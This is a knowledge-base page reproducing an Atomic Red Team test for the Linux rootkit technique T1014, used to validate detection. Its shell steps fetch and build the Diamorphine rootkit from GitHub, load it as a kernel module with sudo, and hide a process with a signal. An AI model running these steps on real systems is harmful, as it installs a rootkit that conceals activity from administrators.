---
atomic_guid: "0b996469-48c6-46e2-8155-a17f8b6c2247"
title: "Loadable Kernel Module based Rootkit (Diamorphine)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1014"
attack_technique_name: "Rootkit"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1014/T1014.yaml"
build_date: "2026-04-26 17:02:12"
executor: "sh"
aliases:
  - "0b996469-48c6-46e2-8155-a17f8b6c2247"
  - "Loadable Kernel Module based Rootkit (Diamorphine)"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Loadable Kernel Module based Rootkit (Diamorphine)

Loads Diamorphine kernel module, which hides itself and a processes.

## Metadata

- Atomic GUID: 0b996469-48c6-46e2-8155-a17f8b6c2247
- Technique: T1014: Rootkit
- Platforms: linux
- Executor: sh
- Elevation Required: True
- Dependency Executor: bash
- Source Path: atomics/T1014/T1014.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1014-rootkit|T1014]]

## Input Arguments

### repo

- description: Url of the diamorphine github repo
- type: string
- default: https://github.com/m0nad/Diamorphine/

### rev

- description: Revision of the github repo zip
- type: string
- default: 898810523aa2033f582a4a5903ffe453334044f9

### rootkit_name

- description: Module name
- type: string
- default: diamorphine

## Dependencies

The kernel module must exist on disk at specified location (#{rootkit_name}.ko)

### Prerequisite Check

```bash
if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;
```

### Get Prerequisite

```bash
mkdir -p /tmp/atomic && cd /tmp/atomic
curl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd Diamorphine-#{rev}
make
sudo cp #{rootkit_name}.ko /lib/modules/$(uname -r)/
sudo depmod -a
```

## Executor

- elevation_required: True
- name: sh

### Command

```bash
sudo modprobe #{rootkit_name}
ping -c 10 localhost >/dev/null & TARGETPID="$!"
ps $TARGETPID
kill -31 $TARGETPID
ps $TARGETPID || echo "process ${TARGETPID} hidden"
```

### Cleanup

```bash
kill -63 1
sudo modprobe -r #{rootkit_name}
sudo rm -rf /lib/modules/$(uname -r)/#{rootkit_name}.ko /tmp/atomic
sudo depmod -a
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1014/T1014.yaml)
